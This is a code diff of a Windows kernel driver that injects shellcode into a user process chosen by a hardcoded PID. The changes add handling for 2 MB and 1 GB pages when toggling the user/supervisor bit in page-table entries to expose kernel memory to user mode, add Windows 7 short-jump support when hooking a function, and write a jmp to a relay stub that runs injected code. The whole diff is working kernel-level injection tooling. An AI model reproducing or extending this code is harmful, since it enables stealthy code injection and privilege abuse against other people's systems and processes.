@@ -12,6 +12,7 @@ NTKERNELAPI PPEB NTAPI PsGetProcessWow64Process(PEPROCESS Process);
 
 ULONG64 g_oep = 0;
 ULONG g_injectPid = 0;
+BOOLEAN g_IsEB = FALSE;
 PVOID g_shellCode = NULL;
 ULONG g_allocateSize = 0;
 ULONG64 g_funcoffset = 0;
@@ -391,6 +392,17 @@ VOID Modify2UserMem()
 					*Ppe |= 4;
 					*Pxe |= 4;
 				}
+				else if (MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//2m page
+				{
+					*Pde |= 4;
+					*Ppe |= 4;
+					*Pxe |= 4;
+				}
+				else if (MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//1g page
+				{
+					*Ppe |= 4;
+					*Pxe |= 4;
+				}
 			}
 		}
 	}
@@ -419,6 +431,17 @@ VOID Modify2KernelMem()
 					{
 						*Pte &= 0xfffffffffffffffb;
 						*Pde &= 0xfffffffffffffffb;
+						*Ppe &= 0xfffffffffffffffb;
+						*Pxe &= 0xfffffffffffffffb;
+					}
+					else if (MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//2m page
+					{
+						*Pde &= 0xfffffffffffffffb;
+						*Ppe &= 0xfffffffffffffffb;
+						*Pxe &= 0xfffffffffffffffb;
+					}
+					else if (MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//1g page
+					{
 						*Ppe &= 0xfffffffffffffffb;
 						*Pxe &= 0xfffffffffffffffb;
 					}
@@ -589,7 +612,7 @@ PVOID fixThread(PVOID Parameter)
 			}
 			break;
 		}
-		Sleep(0x20);
+		Sleep(233);
 	}
 	return NULL;
 }
@@ -636,9 +659,21 @@ NTSTATUS InjectProcessX64(ULONG pid)
 					  0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, KernelMemory
 					  0xFF, 0xE0                                                   // jmp rax
 					};
+					ULONG64 tagetAddress = 0;
 					g_funcAddress = (ULONG64)func;
-					g_funcoffset = *(ULONG*)((PUCHAR)func + 1);
-					ULONG64 tagetAddress = (ULONG64)func + g_funcoffset + 5;
+
+					if (((PUCHAR)func)[0] == 0xEB)//support win7
+					{
+						g_funcoffset = (ULONG)*(PUCHAR)((PUCHAR)func + 1);
+						tagetAddress = (ULONG64)func + g_funcoffset + 2;
+						g_funcoffset = tagetAddress - g_funcAddress - 5;
+					}
+					else
+					{
+						g_funcoffset = *(ULONG*)((PUCHAR)func + 1);
+						tagetAddress = (ULONG64)func + g_funcoffset + 5;
+					}
+
 					ULONG jneAddress = (ULONG)(tagetAddress - (ULONG64)((PUCHAR)relayAddress + 17) - 6);
 					memcpy(checkPid + 13, &pid, sizeof(ULONG));
 					memcpy(checkPid + 19, &jneAddress, sizeof(ULONG));
@@ -724,7 +759,9 @@ NTSTATUS InjectProcessX64(ULONG pid)
 					//MapSC(shellCode, shellcodeAddress,sizeof(shellCode));
 
 					ULONG jmpRelayAddress = (ULONG)((ULONG64)relayAddress - (ULONG64)func - 5);
-					MapSC((PUCHAR)&jmpRelayAddress, (PUCHAR)func + 1, sizeof(ULONG));
+					UCHAR jmpRelay[] = { 0xE9,0,0,0,0 };
+					memcpy(jmpRelay + 1, &jmpRelayAddress, sizeof(ULONG));
+					MapSC(jmpRelay, func, sizeof(jmpRelay));
 
 				}__except(EXCEPTION_EXECUTE_HANDLER){}
 			}
@@ -761,7 +798,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pObj, PUNICODE_STRING pPath)
 	UNREFERENCED_PARAMETER(pPath);
 	pObj->DriverUnload = DriverUnload;
 	//DbgBreakPoint();
-	g_injectPid = 2096;
+	//g_injectPid = 2840;
+	g_injectPid = 7524;
 	InjectProcessX64(g_injectPid);
 	fixTlsGetValue(g_injectPid);
 	return STATUS_SUCCESS;
